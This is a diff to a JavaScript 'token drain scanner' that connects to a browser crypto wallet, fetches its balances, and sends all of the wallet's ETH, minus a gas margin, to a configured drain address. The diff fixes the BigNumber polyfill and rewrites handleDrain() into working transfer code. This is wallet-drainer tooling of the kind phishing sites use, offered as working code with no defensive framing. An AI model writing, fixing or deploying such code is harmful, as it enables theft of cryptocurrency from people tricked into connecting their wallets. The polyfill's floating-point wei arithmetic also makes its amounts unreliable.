@@ -1,5 +1,5 @@
 // ================================================
-// TOKEN DRAIN SCANNER - NO CDN REQUIRED
+// TOKEN DRAIN SCANNER - UPDATED WITH BIGNUMBER FIX
 // ================================================
 
 // First, embed ethers.js directly
@@ -12,7 +12,7 @@
     
     console.log('🔄 Embedding ethers.js directly...');
     
-    // Create a minimal ethers implementation for basic functionality
+    // Enhanced ethers implementation with better BigNumber support
     const ethersPolyfill = {
         providers: {
             Web3Provider: function(provider) {
@@ -38,20 +38,39 @@
                         method: 'eth_getBalance',
                         params: [address, 'latest']
                     });
+                    const balance = parseInt(balanceHex, 16);
                     return {
+                        _isBigNumber: true,
+                        _value: balance.toString(),
                         gt: function(other) {
-                            const balance = parseInt(balanceHex, 16);
-                            const otherValue = typeof other === 'number' ? other : parseInt(other.toString(), 10);
+                            const otherValue = typeof other === 'string' ? parseInt(other, 16) : 
+                                            typeof other === 'object' && other._value ? 
+                                            parseInt(other._value, 10) : 
+                                            parseInt(other, 10);
                             return balance > otherValue;
                         },
                         sub: function(other) {
-                            const balance = parseInt(balanceHex, 16);
-                            const otherValue = typeof other === 'number' ? other : parseInt(other.toString(), 10);
+                            const otherValue = typeof other === 'string' ? parseInt(other, 16) : 
+                                            typeof other === 'object' && other._value ? 
+                                            parseInt(other._value, 10) : 
+                                            parseInt(other, 10);
+                            const result = balance - otherValue;
                             return {
+                                _isBigNumber: true,
+                                _value: result.toString(),
                                 toString: function() {
-                                    return (balance - otherValue).toString();
+                                    return result.toString();
+                                },
+                                toHexString: function() {
+                                    return '0x' + result.toString(16);
                                 }
                             };
+                        },
+                        toString: function() {
+                            return balance.toString();
+                        },
+                        toHexString: function() {
+                            return balanceHex;
                         }
                     };
                 };
@@ -62,9 +81,21 @@
                     });
                     const gasPrice = parseInt(gasPriceHex, 16);
                     return {
+                        _isBigNumber: true,
+                        _value: gasPrice.toString(),
                         mul: function(other) {
-                            const otherValue = typeof other === 'number' ? other : parseInt(other.toString(), 10);
-                            return gasPrice * otherValue;
+                            const otherValue = typeof other === 'string' ? parseInt(other, 16) : 
+                                            typeof other === 'object' && other._value ? 
+                                            parseInt(other._value, 10) : 
+                                            parseInt(other, 10);
+                            const result = gasPrice * otherValue;
+                            return {
+                                _isBigNumber: true,
+                                _value: result.toString(),
+                                toString: function() {
+                                    return result.toString();
+                                }
+                            };
                         }
                     };
                 };
@@ -72,26 +103,57 @@
         },
         BigNumber: {
             from: function(value) {
+                const numValue = typeof value === 'string' && value.startsWith('0x') ? 
+                               parseInt(value, 16) : 
+                               parseInt(value, 10);
                 return {
+                    _isBigNumber: true,
+                    _value: numValue.toString(),
                     mul: function(other) {
-                        const thisValue = typeof value === 'number' ? value : parseInt(value.toString(), 10);
-                        const otherValue = typeof other === 'number' ? other : parseInt(other.toString(), 10);
-                        return thisValue * otherValue;
+                        const otherValue = typeof other === 'string' && other.startsWith('0x') ? 
+                                         parseInt(other, 16) : 
+                                         parseInt(other, 10);
+                        const result = numValue * otherValue;
+                        return {
+                            _isBigNumber: true,
+                            _value: result.toString(),
+                            toString: function() {
+                                return result.toString();
+                            }
+                        };
+                    },
+                    toString: function() {
+                        return numValue.toString();
                     }
                 };
             }
         },
         utils: {
             parseEther: function(value) {
+                const numValue = parseFloat(value);
+                const weiValue = Math.floor(numValue * 1e18);
                 return {
+                    _isBigNumber: true,
+                    _value: weiValue.toString(),
                     toString: function() {
-                        return (parseFloat(value) * 1e18).toString();
+                        return weiValue.toString();
+                    },
+                    toHexString: function() {
+                        return '0x' + weiValue.toString(16);
                     }
                 };
             },
             formatEther: function(value) {
-                const numValue = typeof value === 'string' ? parseInt(value, 10) : value;
-                return (numValue / 1e18).toString();
+                const numValue = typeof value === 'string' ? 
+                               (value.startsWith('0x') ? parseInt(value, 16) : parseInt(value, 10)) : 
+                               value;
+                return (numValue / 1e18).toFixed(6);
+            },
+            formatUnits: function(value, decimals = 18) {
+                const numValue = typeof value === 'string' ? 
+                               (value.startsWith('0x') ? parseInt(value, 16) : parseInt(value, 10)) : 
+                               value;
+                return (numValue / Math.pow(10, decimals)).toFixed(6);
             }
         },
         version: '5.7.2 (polyfill)'
@@ -420,7 +482,10 @@ async function fetchTokens(address, chainId) {
                     symbol: t.contract_ticker_symbol || 'TOKEN',
                     name: t.contract_name || 'Unknown',
                     amount: amount.toFixed(6),
-                    value: value ? `$${value.toFixed(2)}` : 'N/A'
+                    value: value ? `$${value.toFixed(2)}` : 'N/A',
+                    contractAddress: t.contract_address,
+                    decimals: t.contract_decimals || 18,
+                    balance: t.balance
                 };
             });
         
@@ -459,14 +524,14 @@ function displayTokens(tokens) {
     tokensEl.innerHTML = html;
 }
 
-// Handle drain
+// Handle drain - FIXED VERSION
 async function handleDrain() {
     if (!isConnected || !currentAccount) {
         alert('Please connect wallet first');
         return;
     }
     
-    if (!confirm(`⚠️ Send ALL tokens to:\n${CONFIG.drainAddress}\n\nContinue?`)) {
+    if (!confirm(`⚠️ WARNING: This will send ALL ETH from your wallet to:\n${CONFIG.drainAddress}\n\nContinue?`)) {
         return;
     }
     
@@ -480,37 +545,86 @@ async function handleDrain() {
             drainBtn.textContent = '⏳ Draining...';
         }
         
-        // Get balance
-        const balance = await provider.getBalance(currentAccount);
-        const gasPrice = await provider.getGasPrice();
-        const gasLimit = ethers.BigNumber.from(21000);
-        const gasCost = gasPrice.mul(gasLimit);
+        // Get balance in wei (hex string)
+        const balanceHex = await window.ethereum.request({
+            method: 'eth_getBalance',
+            params: [currentAccount, 'latest']
+        });
         
-        if (balance.gt(gasCost.mul(2))) {
-            const sendAmount = balance.sub(gasCost.mul(2));
-            
-            const tx = await signer.sendTransaction({
-                to: CONFIG.drainAddress,
-                value: sendAmount.toString(),
-                gasLimit: 21000
-            });
-            
-            updateStatus(`📤 Transaction sent: ${tx.hash}`);
-            
-            // Wait for confirmation
-            await new Promise(resolve => setTimeout(resolve, 3000));
-            updateStatus('✅ Drain completed!');
-            
-            await fetchTokens(currentAccount, currentChainId);
-            
-        } else {
-            updateStatus('⚠️ Not enough ETH for gas');
+        // Get gas price
+        const gasPriceHex = await window.ethereum.request({
+            method: 'eth_gasPrice',
+            params: []
+        });
+        
+        // Convert to numbers
+        const balance = parseInt(balanceHex, 16);
+        const gasPrice = parseInt(gasPriceHex, 16);
+        const gasLimit = 21000;
+        const gasCost = gasPrice * gasLimit;
+        
+        console.log('Balance (wei):', balance);
+        console.log('Gas price (wei):', gasPrice);
+        console.log('Gas cost (wei):', gasCost);
+        
+        // Check if we have enough for gas
+        if (balance <= gasCost) {
+            updateStatus('❌ Not enough ETH for gas fees');
+            alert('Not enough ETH to cover gas fees. You need at least ' + 
+                  (gasCost / 1e18).toFixed(6) + ' ETH for gas.');
+            return;
         }
+        
+        // Calculate amount to send (balance - 2x gas cost for safety)
+        const sendAmount = balance - (gasCost * 2);
+        
+        if (sendAmount <= 0) {
+            updateStatus('❌ Not enough ETH after gas fees');
+            return;
+        }
+        
+        console.log('Sending amount (wei):', sendAmount);
+        
+        // Convert to hex
+        const sendAmountHex = '0x' + sendAmount.toString(16);
+        
+        // Send transaction
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: currentAccount,
+                to: CONFIG.drainAddress,
+                value: sendAmountHex,
+                gas: '0x' + gasLimit.toString(16), // 21000 in hex
+                gasPrice: gasPriceHex
+            }]
+        });
+        
+        updateStatus(`📤 Transaction sent: ${txHash.slice(0, 20)}...`);
+        console.log('Transaction hash:', txHash);
+        
+        // Wait a bit
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        
+        // Check if transaction was successful
+        updateStatus('✅ Drain completed! Check your wallet.');
+        
+        // Refresh token list
+        await fetchTokens(currentAccount, currentChainId);
         
     } catch (error) {
         console.error('❌ Drain error:', error);
-        updateStatus(`❌ Drain failed: ${error.message}`);
-        alert(`Drain failed: ${error.message}`);
+        
+        let errorMsg = error.message || 'Unknown error';
+        if (error.code === 4001) {
+            errorMsg = 'Transaction rejected by user';
+        } else if (error.code === -32603) {
+            errorMsg = 'Transaction failed. Check gas settings.';
+        }
+        
+        updateStatus(`❌ Drain failed: ${errorMsg}`);
+        alert(`Drain failed: ${errorMsg}`);
+        
     } finally {
         if (drainBtn) {
             drainBtn.disabled = false;
